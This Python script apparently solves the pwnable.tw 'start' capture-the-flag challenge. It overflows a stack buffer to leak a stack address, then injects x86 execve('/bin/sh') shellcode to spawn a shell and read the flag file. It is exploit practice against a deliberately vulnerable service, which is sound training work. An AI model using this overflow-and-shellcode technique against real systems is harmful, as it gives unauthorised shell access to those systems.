import socket




def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = 'chall.pwnable.tw'
    port = 10000
    s.connect((host, port))
    s.recv(1024)
    s.send(str.encode("A"*20) + b'\x87\x80\x04\x08')
    data = s.recv(1024)
    offset_addr = hex(int(data[:4].hex()[:2], 16) + int("14", 16))[2:] + data[:4].hex()[2:]  # offset = 0x14
    s.send(str.encode("A"*20) + bytearray.fromhex(offset_addr)
           + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89'
             b'\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
           )  # http://shell-storm.org/shellcode/files/shellcode-811.php
    s.send(str.encode("cat /home/start/flag\n"))
    data = s.recv(1024)
    print(data)
    s.close()


if __name__ == '__main__':
    main()
